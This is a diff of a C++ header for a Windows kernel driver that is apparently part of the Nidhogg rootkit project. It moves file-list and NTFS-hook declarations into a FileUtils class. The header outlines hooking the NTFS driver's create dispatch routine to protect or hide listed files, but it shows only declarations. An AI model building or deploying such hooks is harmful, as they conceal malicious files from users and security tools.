@@ -12,21 +12,13 @@ extern "C" {
 constexpr SIZE_T MAX_FILES = 256;
 constexpr SIZE_T SUPPORTED_HOOKED_NTFS_CALLBACKS = 1;
 
-// Prototypes.
-bool FindFile(WCHAR* path);
-bool AddFile(WCHAR* path);
-bool RemoveFile(WCHAR* path);
-NTSTATUS HookedNtfsIrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp);
-NTSTATUS InstallNtfsHook(int irpMjFunction);
-NTSTATUS UninstallNtfsHook(int irpMjFunction);
-
 struct FileItem {
-	int FileIndex;
+	ULONG FileIndex;
 	WCHAR FilePath[MAX_PATH];
 };
 
 struct FilesList {
-	int FilesCount;
+	ULONG FilesCount;
 	WCHAR* FilesPath[MAX_FILES];
 };
 
@@ -35,18 +27,38 @@ struct NtfsCallback {
 	bool Activated;
 };
 
-struct FileGlobals {
+class FileUtils {
+private:
 	FilesList Files;
 	FastMutex Lock;
 	NtfsCallback Callbacks[SUPPORTED_HOOKED_NTFS_CALLBACKS];
 
-	void Init() {
-		Files.FilesCount = 0;
-
-		for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++)
-			Callbacks[i].Activated = false;
-
-		Lock.Init();
+public:
+	void* operator new(size_t size) {
+		return ExAllocatePoolWithTag(NonPagedPool, size, DRIVER_TAG);
 	}
+
+	void operator delete(void* p) {
+		ExFreePoolWithTag(p, DRIVER_TAG);
+	}
+
+	FileUtils();
+	~FileUtils();
+
+	bool FindFile(WCHAR* path);
+	bool AddFile(WCHAR* path);
+	bool RemoveFile(WCHAR* path);
+	void ClearFilesList();
+	NTSTATUS QueryFiles(FileItem* item);
+	NTSTATUS InstallNtfsHook(int irpMjFunction);
+	NTSTATUS UninstallNtfsHook(int irpMjFunction);
+
+	FastMutex GetFileLock() { return this->Lock; }
+	ULONG GetFilesCount() { return this->Files.FilesCount; }
+	NtfsCallback GetNtfsCallback(ULONG index) { return this->Callbacks[index]; }
+	bool IsCallbackActivated(ULONG index) { return this->Callbacks[index].Activated; }
 };
-inline FileGlobals fGlobals;
+
+inline FileUtils* NidhoggFileUtils;
+
+NTSTATUS HookedNtfsIrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp);
